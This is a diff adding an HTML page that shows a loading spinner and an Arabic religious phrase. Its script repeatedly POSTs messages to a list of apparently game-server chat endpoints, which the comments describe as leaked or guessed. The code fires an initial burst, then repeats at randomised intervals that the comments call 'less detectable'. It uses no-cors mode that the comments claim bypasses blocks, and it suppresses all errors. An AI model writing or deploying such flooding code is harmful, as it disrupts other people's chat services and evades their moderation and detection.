@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>جاري التحميل...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 3.5rem;
+      margin: 0.5rem 0;
+      text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+    p.status {
+      font-size: 1.4rem;
+      opacity: 0.9;
+      margin: 1rem 0;
+    }
+    .spinner {
+      width: 80px;
+      height: 80px;
+      border: 8px solid rgba(255,255,255,0.2);
+      border-top: 8px solid #ffd700;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+      margin: 1.5rem 0;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700; }
+      to   { text-shadow: 0 0 30px #ff4500, 0 0 60px #ff4500; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="spinner"></div>
+  <h1>جاري الإرسال...</h1>
+  <p class="status">صلو على النبي ﷺ</p>
+
+  <script>
+    const msg = "صلو على النبي ﷺ";
+
+    // Body payloads prepared once (better performance)
+    const simpleBody    = JSON.stringify({ message: msg });
+    const dangerBody    = JSON.stringify({
+      message: msg,
+      channel: "شات العام",
+      color: null,
+      isImageAndLinksAllowed: [false, false]
+    });
+    const easyBody      = JSON.stringify({ message: msg, channel: "شات العام" });
+    const hoBody        = JSON.stringify({
+      Type: "chatResult",
+      message: msg,
+      chatType: "general"
+    });
+
+    // List of endpoints – you can add more if you know other leaked/patched chat resources
+    const endpoints = [
+      { url: "https://flix-scripts/chatResult",                  method: "POST", body: simpleBody,   headers: {"Content-Type": "application/json"} },
+      { url: "https://danger_chat/Danger_Chat:SendMessage",      method: "POST", body: dangerBody,   headers: {"Content-Type": "application/json"} },
+      { url: "https://easy-chat+/o6ZbK5Ecp6",                    method: "POST", body: easyBody,     headers: {"Content-Type": "application/json", "accept": "*/*"} },
+      { url: "https://melix_chat/chatResult",                    method: "POST", body: simpleBody,   headers: {"Content-Type": "application/json"} },
+      { url: "https://as_chat/chatResult",                       method: "POST", body: simpleBody,   headers: {"Content-Type": "application/json"} },
+      { url: "https://chat/chatResult",                          method: "POST", body: simpleBody,   headers: {"Content-Type": "application/json"} },
+      { url: "https://ho-chatv2/Chat",                           method: "POST", body: hoBody,       headers: {"Content-Type": "application/json"} },
+
+      // Additional known / guessed legacy / leaked endpoints (2025-2026 style)
+      { url: "https://chat-system/send",                         method: "POST", body: simpleBody },
+      { url: "https://nui-chat/postMessage",                     method: "POST", body: simpleBody },
+      { url: "https://rp-chat/api/send",                         method: "POST", body: simpleBody },
+      { url: "https://voice-chat/broadcast",                     method: "POST", body: simpleBody }
+    ];
+
+    // Optimized spam function
+    function spam() {
+      endpoints.forEach(ep => {
+        fetch(ep.url, {
+          method: ep.method || "POST",
+          headers: ep.headers || {"Content-Type": "application/json"},
+          body: ep.body,
+          mode: "no-cors",          // helps bypass some CORS blocks
+          cache: "no-cache",
+          redirect: "follow",
+          referrerPolicy: "no-referrer"
+        })
+        .catch(() => {});           // silent fail – no console spam
+      });
+    }
+
+    // Start aggressive spam – every 800–1200 ms (less detectable than 1000 exact)
+    setInterval(spam, Math.floor(Math.random() * 400) + 800);
+
+    // Initial burst (3 instant attempts)
+    for (let i = 0; i < 3; i++) {
+      setTimeout(spam, i * 300);
+    }
+
+  </script>
+
+</body>
+</html>
